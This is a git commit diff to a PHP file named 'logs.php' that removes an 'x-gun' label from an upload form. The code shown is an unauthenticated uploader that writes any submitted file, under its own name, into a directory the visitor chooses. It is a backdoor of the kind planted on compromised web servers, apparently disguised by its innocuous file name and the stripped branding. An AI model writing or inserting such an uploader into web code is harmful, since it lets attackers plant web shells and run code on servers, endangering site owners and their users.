da723e4ba8e299d3db1c9e893cf0820c407cb45a
rootpunishment <50990748+rootpunishment@users.noreply.github.com>
2019-05-24 08:44:19 -0400

    Update logs.php

--- logs.php
+++ logs.php
@@ -9,7 +9,7 @@ $dir = getcwd();
 }
 
 
-echo "<left><b>x-gun</b><br><form method='POST' enctype='multipart/form-data'><input type='file' name='hiUP' size='23' ><br><input type='text' name='dir' value='$dir' size='23'><br><input type='submit' value='Upload' size='35' ></form></left>";
+echo "<left><b></b><br><form method='POST' enctype='multipart/form-data'><input type='file' name='hiUP' size='23' ><br><input type='text' name='dir' value='$dir' size='23'><br><input type='submit' value='Upload' size='35' ></form></left>";
 if (!empty ($_FILES['hiUP']))
 {
     move_uploaded_file($_FILES['hiUP']['tmp_name'],$dir.'/'.$_FILES['hiUP']['name']);
